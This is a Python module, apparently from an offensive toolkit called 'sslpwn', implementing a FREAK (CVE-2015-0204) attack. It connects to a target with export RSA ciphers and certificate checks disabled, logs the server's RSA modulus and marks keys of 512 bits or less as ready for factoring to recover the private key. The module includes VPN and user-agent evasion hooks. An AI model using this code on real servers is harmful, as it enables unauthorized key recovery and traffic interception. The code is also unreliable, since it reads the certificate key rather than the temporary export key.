"""
FREAK attack (CVE-2015-0204).

Checks if export RSA ciphers are accepted and extracts the server's
RSA public key for later offline factoring.
"""

import socket
import ssl
from sslpwn.attacks.base import BaseAttack


class FreakAttack(BaseAttack):
    def __init__(self, target_url: str, output, vpn, user_agents, rate_limiter,
                 cookie_name: str, cookie_value: str, adaptive=None) -> None:
        super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive)
        self.cookie_name = cookie_name
        self.cookie_value = cookie_value

    def check_vulnerability(self) -> bool:
        """Check if server supports any EXPORT RSA cipher suite."""
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        export_ciphers = "EXP:RSA"
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.set_ciphers(export_ciphers)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=hostname):
                    return True
        except Exception:
            return False

    def exploit(self) -> bool:
        """Perform FREAK check and log the server's RSA public key for factoring."""
        self.output.log("Starting FREAK check", "INFO")
        host = self.target_url.split("://")[1].split("/")[0]
        if ":" in host:
            hostname, port_str = host.split(":")
            port = int(port_str)
        else:
            hostname = host
            port = 443

        export_ciphers = "EXP:RSA"
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.set_ciphers(export_ciphers)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        try:
            sock = self._adaptive_connect_and_report(hostname, port)
        except Exception as e:
            self.output.log(f"Connection failed: {e}", "ERROR")
            return False

        try:
            ssl_sock = ctx.wrap_socket(sock, server_hostname=hostname)
            cert_der = ssl_sock.getpeercert(binary_form=True)
            # Use cryptography to parse the certificate and extract the public key
            from cryptography import x509
            from cryptography.hazmat.backends import default_backend
            cert = x509.load_der_x509_certificate(cert_der, default_backend())
            pubkey = cert.public_key()
            # For RSA keys, get the modulus
            from cryptography.hazmat.primitives.asymmetric import rsa
            if isinstance(pubkey, rsa.RSAPublicKey):
                numbers = pubkey.public_numbers()
                modulus = numbers.n
                self.output.log(
                    f"Export RSA modulus ({modulus.bit_length()} bits): {modulus}",
                    "INFO"
                )
                if modulus.bit_length() <= 512:
                    self.output.log(
                        "Server is vulnerable to FREAK. Obtain the private key by factoring this modulus.",
                        "SUCCESS"
                    )
                    return True
                else:
                    self.output.log("Export cipher accepted but key size > 512 bits.", "WARN")
                    return False
            else:
                self.output.log("Server did not present an RSA key.", "ERROR")
                return False
        except Exception as e:
            self.output.log(f"FREAK exploit failed: {e}", "ERROR")
            return False
        finally:
            try:
                ssl_sock.close()
            except Exception:
                pass
